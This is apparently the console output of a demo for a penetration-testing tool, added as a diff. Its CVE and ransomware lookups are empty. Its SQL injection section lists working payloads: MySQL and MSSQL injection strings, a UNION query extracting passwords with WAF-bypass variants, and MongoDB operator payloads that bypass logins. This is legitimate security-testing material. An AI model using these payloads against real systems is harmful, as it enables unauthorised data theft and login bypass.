@@ -1,0 +1,99 @@
+
+===============================================================
+           Zen AI Pentest - Database Demo
+                  CVE | Ransomware | SQLi
+===============================================================
+    
+
+============================================================
+  CVE & RANSOMWARE DATABASE DEMO
+============================================================
+
+[1] Searching for EternalBlue (CVE-2017-0144)...
+
+[2] Searching for WannaCry ransomware...
+
+[3] Checking system indicators against ransomware database...
+  [OK] No ransomware indicators detected
+
+[4] Available ransomware in database:
+
+[5] Top Critical CVEs:
+
+============================================================
+  SQL INJECTION DATABASE DEMO
+============================================================
+
+[1] MySQL Error-Based Payloads:
+
+  MySQL Error - Single Quote:
+    Payload: '
+    Expected: MySQL error message revealing SQL syntax
+
+  MySQL Error - Double Quote:
+    Payload: "
+    Expected: MySQL error message
+
+  MySQL Error - AND 1=1:
+    Payload:  AND 1=1
+    Expected: Query executes normally
+
+[2] MSSQL Time-Based Payloads:
+
+  MSSQL Time - WAITFOR:
+    Payload: '; WAITFOR DELAY '0:0:5'--
+    Description: Time-based with WAITFOR
+
+[3] WAF Bypass Variants:
+  Original: ' UNION SELECT password FROM users--
+  Variants:
+    1. ' UnIoN SeLeCt password FROM users--
+    2. ' UNION SELECT password FROM users--
+    3. '/*!50000*/UNION/*!50000*/SELECT/*!50000*/password/*!50000*/FROM/*!50000*/users--
+    4. '/**/UNION/**/SELECT/**/password/**/FROM/**/users--
+    5. '%09UNION%09SELECT%09password%09FROM%09users--
+
+[4] MySQL Injection Cheatsheet (excerpt):
+  MySQL SQL Injection Cheatsheet:
+  Comments:
+    -- - (space required after --)
+    #
+    /* */
+  Version:
+    SELECT @@version
+  ...
+
+[5] MongoDB NoSQL Injection Payloads:
+
+  MongoDB - $ne Operator:
+    Payload: {"username": {"$ne": null}, "password": {"$ne": null}}
+    Description: NoSQL injection with $ne operator
+
+  MongoDB - $gt Operator:
+    Payload: {"username": {"$gt": ""}, "password": {"$gt": ""}}
+    Description: NoSQL injection with $gt operator
+
+  MongoDB - $regex:
+    Payload: {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+    Description: NoSQL injection with $regex
+
+============================================================
+  DATABASE STATISTICS
+============================================================
+
+CVE Database:
+  Total CVEs: 0
+  Critical CVEs: 0
+  Ransomware Families: 0
+  Estimated Total Damage: $0
+
+SQL Injection Database:
+  Total Payloads: 48
+  Database Types: 8
+  Techniques: 6
+
+============================================================
+  DEMO COMPLETED
+============================================================
+
+For more information, see the README.md and data/README.md files
